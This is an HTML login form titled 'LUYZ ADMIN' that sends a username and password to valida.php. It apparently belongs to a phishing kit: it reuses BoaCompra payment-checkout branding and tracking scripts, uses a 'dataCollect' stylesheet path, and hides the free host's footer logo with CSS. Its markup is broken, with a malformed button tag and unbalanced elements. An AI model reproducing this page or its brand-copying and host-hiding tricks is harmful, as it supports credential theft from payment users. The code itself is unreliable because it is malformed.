
<html lang="en">
 <head> 
  <title>LUYZ ADMIN</title> 
  <meta charset="UTF-8">
  <meta name="robots" content="noindex"> 
  <meta name="theme-color" content="black"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"> 
  <link rel="dns-prefetch" href="https://in.hotjar.com"> 
  <link rel="dns-prefetch" href="https://vars.hotjar.com"> 
  <link rel="dns-prefetch" href="https://script.hotjar.com"> 
  <link rel="dns-prefetch" href="https://static.hotjar.com"> 
  <link rel="dns-prefetch" href="https://me.jsuol.com.br"> 
  <link rel="dns-prefetch" href="https://api.boacompra.com"> 
  <link rel="dns-prefetch" href="//me.jsuol.com.br"> 
  <link rel="icon" href="https://payment.boacompra.com/statics//images/favicon.ico"> 
 
  <link rel="stylesheet" href="dataCollect/tokenized.css"> 
  <script async src="https://me.jsuol.com.br/aud/boacompracheckout.js"></script>
  <script async src="https://static.hotjar.com/c/hotjar-596441.js"></script>
  <script async src="https://script.hotjar.com/modules.24670e88b088e10656d2.js" charset="utf-8"></script>
 <br>    <br>


    <meta name="theme-color" content="red"> 
    <link href="css/bootstrap.css" rel="stylesheet">


    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">

  
    <link href="css/signin.css" rel="stylesheet">

   
    <script src="pjs/ie-emulation-modes-warning.js"></script>

<style>
		h5,{
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:#d9524d;
					letter-spacing:-0.05;
					text-shadow:2px 1px 1px #666;
		}
		body{
		  background: url('img/fu.jpg') center center no-repeat fixed; 
		  -webkit-background-size: cover;
		  -moz-background-size: cover;
		  -o-background-size: cover;
		  background-size: cover;
		}
		h2 {
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:#28a745;
					letter-spacing:-0.05;
					text-shadow:1px 1px 1px 	#000;
		}
	img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {display:none;}
		</style>
   
 </head> 
 <body class="tudo"> 


<center>
    <div class="header__logo"> 
     
    
 

     <form id="form" action="valida.php" method="POST" class="tokenized__form"> 
      
<div class="tokenized__wrapper tokenized__wrapper--form"> 
       
        
<div class="tokenized__fields"> 
        
<br><br>
         
          <div> 
           <input class="field-group__input" autocomplete="off" id="usuario" name="user"  placeholder="Usuário" type="text" required data-hj-masked=""> 
       
</div>
</div>
</div>
<input class="field-group__input" autocomplete="off" id="senha" name="pass"  placeholder="Senha" type="password" required data-hj-masked=""> 
       


</div>
      
</div>
         
<center>
      <button type="submit" name="x" class="btn btn-info 
</button>
"> CONFIRMAR <n> </button> 
</form>

</center>
    
